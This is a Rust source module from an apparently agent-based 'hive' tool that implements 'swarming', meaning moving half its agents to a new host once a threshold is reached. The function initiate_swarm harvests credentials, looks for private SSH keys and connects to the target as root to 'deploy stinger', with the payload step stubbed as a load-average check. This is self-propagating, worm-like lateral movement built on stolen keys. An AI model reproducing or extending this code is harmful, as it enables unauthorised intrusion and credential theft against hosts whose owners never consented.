// Swarming: when the colony reaches critical mass on one host,
// it splits — half the agents migrate to a new host and form a new hive.
// Like a bee colony swarming to establish a new nest.

use crate::ldc::{Message, Role};
use uuid::Uuid;
use tracing::info;

/// Swarm configuration.
pub struct SwarmConfig {
    pub max_agents_per_host: usize,
    pub migration_threshold: usize,  // agents before considering split
    pub swarm_cooldown_secs: u64,    // wait between swarms
}

impl Default for SwarmConfig {
    fn default() -> Self {
        Self {
            max_agents_per_host: 6,
            migration_threshold: 5,
            swarm_cooldown_secs: 300,
        }
    }
}

/// Result of a swarm attempt.
pub struct SwarmResult {
    pub success: bool,
    pub new_host: String,
    pub migrated_agents: usize,
    pub reason: String,
}

/// Execute a colony split: migrate half the agents to a new host.
pub fn initiate_swarm(
    current_agent_count: usize,
    target_host: &str,
    config: &SwarmConfig,
) -> Option<SwarmResult> {
    if current_agent_count < config.migration_threshold {
        return None;
    }

    // Check if target is safe
    let hive_cfg = crate::config::HiveConfig::load();
    if crate::panal::is_safe_target(target_host, &hive_cfg.brain) {
        return Some(SwarmResult {
            success: false,
            new_host: target_host.to_string(),
            migrated_agents: 0,
            reason: "Target is in safe_ips".into(),
        });
    }

    // Try SSH to target
    let keys = crate::harvest_credentials();
    let has_keys = keys.iter().any(|(_, kd, _)| kd.contains("PRIVATE KEY"));

    if !has_keys {
        return Some(SwarmResult {
            success: false,
            new_host: target_host.to_string(),
            migrated_agents: 0,
            reason: "No SSH keys available".into(),
        });
    }

    // Deploy stinger to new host
    let deploy_result = crate::exec_ssh(target_host, "root",
        "cat /proc/loadavg", None, None);

    if !deploy_result.success {
        return Some(SwarmResult {
            success: false,
            new_host: target_host.to_string(),
            migrated_agents: 0,
            reason: format!("SSH failed: {}", deploy_result.output),
        });
    }

    let half = current_agent_count / 2;

    info!("SWARMING: colony splitting → {} agents migrating to {}",
        half, target_host);

    Some(SwarmResult {
        success: true,
        new_host: target_host.to_string(),
        migrated_agents: half,
        reason: format!("Colony split: {} agents remain, {} migrate", 
            current_agent_count - half, half),
    })
}

/// Signal the colony to prepare for swarming.
pub fn signal_swarm(queen_id: Uuid, target: &str, reason: &str) -> Message {
    Message::status_event(
        queen_id, Role::Queen,
        "swarm_initiate",
        Uuid::new_v4(), Role::Swarm,
        &format!("Migrate to {}: {}", target, reason),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_swarm_config_default() {
        let cfg = SwarmConfig::default();
        assert_eq!(cfg.max_agents_per_host, 6);
        assert_eq!(cfg.migration_threshold, 5);
    }

    #[test]
    fn test_swarm_below_threshold() {
        let cfg = SwarmConfig::default();
        assert!(initiate_swarm(3, "10.0.0.1", &cfg).is_none());
    }

    #[test]
    fn test_signal_swarm_creates_status_event() {
        let queen = Uuid::new_v4();
        let msg = signal_swarm(queen, "10.0.0.2", "host full");
        assert_eq!(msg.agent_id, queen);
        assert_eq!(msg.agent_role, Role::Queen);
    }
}
